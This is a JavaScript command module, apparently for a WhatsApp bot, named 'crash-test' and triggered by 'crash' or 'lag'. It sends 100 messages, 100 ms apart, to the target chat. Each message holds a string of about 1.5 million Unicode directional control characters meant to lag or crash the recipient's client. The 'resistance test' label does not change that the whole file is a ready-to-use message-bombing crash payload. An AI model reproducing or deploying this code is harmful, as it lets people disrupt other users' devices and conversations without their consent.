const { PREFIX } = require("../../krampus");

function calcularFactorial(n) {
  if (n === 0) {
    return 1;
  } else {
    return n * calcularFactorial(n - 1);
  }
}

function enviarMensaje(socket, remoteJid, mensaje) {
  return new Promise(resolve => {
    socket.sendMessage(remoteJid, { text: mensaje });
    resolve();
  });
}

module.exports = {
  name: "crash-test",
  description: "Envía un mensaje lagger para probar la resistencia del cliente.",
  commands: ["crash", "lag"],
  usage: `${PREFIX}crash`,
  handle: async ({ socket, remoteJid }) => {
    try {
      // Configuración de la prueba
      const lagStringLength = 500000; // Longitud del string lagger
      const lagStringRepeat = 100; // Número de veces que se repite el string lagger
      const delayBetweenMessages = 100; // Retraso entre mensajes (en milisegundos)

      // Crear string lagger
      const lagString = "\u200F\u200E\u202E".repeat(lagStringLength);

      // Enviar mensajes lagger
      let i = 0;
      while (i < lagStringRepeat) {
        const mensaje = lagString + calcularFactorial(100);
        await enviarMensaje(socket, remoteJid, mensaje);
        await new Promise(resolve => setTimeout(resolve, delayBetweenMessages));
        i++;
      }

      console.log("Prueba de resistencia finalizada.");
    } catch (error) {
      console.error("Error en crash-test:", error);
    }
  },
};
